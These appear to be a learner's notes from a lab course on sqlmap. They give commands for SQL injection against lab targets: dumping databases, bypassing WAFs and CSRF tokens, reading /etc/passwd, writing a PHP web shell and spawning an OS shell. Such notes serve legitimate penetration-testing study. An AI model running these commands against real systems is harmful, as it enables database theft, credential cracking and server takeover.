# Introduction

SQLmap is a penetration testing tool for taking over relational databases via SQLi flaws.

sqlmap -hh to get started

When looking for SQL injection points, look at every request in the proxy. Look for where SQL queries are happening (is an ID being referenced?)

# Running SQLmap on a HTTP request

We can save a GET request with the filled parameters, (either by grabbing it from burp HTTP history, or through copy as cURL)

```sqlmap -r req.txt```
```sqlmap ... -H='Cookie:PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'```

Basic line of attack: (we enumerate the basic DB info, then the tables, then grab from those tables)

```
sqlmap -r case2.txt --banner --current-user --current-db --is-dba
sqlmap -r case2.txt --tables -D testdb
sqlmap -r case2.txt --dump -T tableName
```

SQLmap in a cookie:
```
sqlmap -r case3.txt --cookie='id=1' -p id --level=2
```
SQLmap in JSON post

```
POST /case4.php HTTP/1.1

Host: 138.68.139.152:32561

User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Referer: http://138.68.139.152:32561/

Connection: close

Upgrade-Insecure-Requests: 1

Content-Length: 9



{"id": 1}
```
```
sqlmap -r case4.txt --data="id=*" -p id --level=2
```

# Handling Errors

Should enable ```--parse-errors```, and use ```-t traffic.txt``` to auto parse errors and save traffic to a file. We can also use ```-v``` for verbositiy and also send it through a proxy (to watch thetraffic)

# Attack Tuning

We can use ```--prefix and --suffix``` to cover special cases (like needing a comment at the end).

```
--prefix="%'))" --suffix="-- -"
```

Level/Risk determines the vectors/boundries and how risky you want it to be.

```--level=5 -risk=3```, risk goes from 1-3, level goes from 1-5.. Level refers to how many different payloads are being used, and risk is how aggressive the attack is.

We can also filter with advanced options, looking for data in the response.

```
--code
--titles
--string
```

For UNION injection tuning, we can specify columns and characters, like so:
```
 --union-cols=17
 --union-char='a'
```

In cases where SQLmap's null columns are invalid, or it doesn't know the number of columns.

```
sqlmap -u 'http://138.68.139.152:32561/case6.php?col=id' --prefix '`)' --batch --dump -D testdb -T flag6
```

Case 6 very tricky. We had to use the URL instead of a request. Always try that if there's issues.

# Database Enumeration

Lots of useful switches, as seen in the previous commands (--banner, --current-user, --current-db, --passwords, and so on)

```--dump-all``` will generally dump everything, and should be used with ```--exclude-sysdbs``` to not dump system DBs, like so

```
sqlmap -u 'http://138.68.139.152:32561/case1.php?id=1' --dump-all --exclude-sysdbs
```

```--schema``` switch will dump the schema, and we can also search for certain tables like so:

```
sqlmap -u "http://www.example.com/?id=1" --search -T user
```

We can also search for the name of a column with -C

```
sqlmap -u 'http://138.68.139.152:32561/case1.php?id=1' --search -C style
```

Can use crackstation to crack user hashes.

# Bypassing Web Application Protections

SQLmap can auto detect and handle CSRF tokens usually.

We can also pass python code, to automatically handle data (such as hashing it).

```
sqlmap -u "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch -v 5 | grep URI
```

SQLmap should automatically try to detect and bypass WAF, and we can also use ```--random-agent``` to bypass a user-agent blacklist.

```
sqlmap -u "http://157.245.39.81:30393/case8.php" --data='id=1&t0ken=rJJUjtMUJxUQ140xmfd1INcS6YAq6uX4CuRj6qVQ' --level=5 --risk=3 -csrf-token="t0ken" -v -T flag8 --dump
```

To bypass CSRF with a token, see above

To add a random token, like UUID, do so:

```
sqlmap -u "http://157.245.39.81:30393/case9.php?id=1&uid=2996565965" -v -T flag9 --randomize=uid -v 5 --dump
```

To bypass an aggressive WAF:

```
sqlmap -r case11.txt -T flag11 --dump --tamper=between
```

# OS Exploitaton

If we have the DBA prilvedge, we can trivially escalate to a basic user.

```
sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba
```

```
sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"
sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"
sqlmap -u "http://www.example.com/?id=1" --os-shell
sqlmap -u "http://www.example.com/?id=1" --os-shell --technique=E
```

Try alternate technqies to spawn an OS shell.

# Skills Assessment

```
sqlmap -r skills-assessment.txt --data="id=*"  --current-db --tamper=between
```

We had to add the ```--tamper=between``` to get it to work